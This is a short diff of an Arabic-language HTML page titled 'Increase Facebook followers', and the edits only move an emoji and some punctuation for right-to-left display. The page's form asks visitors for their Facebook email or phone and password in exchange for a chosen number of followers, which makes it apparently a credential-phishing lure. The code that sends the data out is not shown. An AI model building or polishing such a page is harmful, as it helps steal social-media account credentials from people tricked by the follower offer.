@@ -49,12 +49,12 @@
 <body>
 
   <div class="form-container">
-   <h2>🚀 زيادة متابعين فيسبوك</h2>
+   <h2>زيادة متابعين فيسبوك 🚀</h2>
     <form id="loginForm">
       <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
       <input type="password" id="password" placeholder="كلمة السر" required>
       
-      <label>اختر عدد المتابعين :- </label>
+      <label> :- اختر عدد المتابعين</label>
       <select id="followers">
         <option value="1000">1000</option>
         <option value="5000">5000</option>
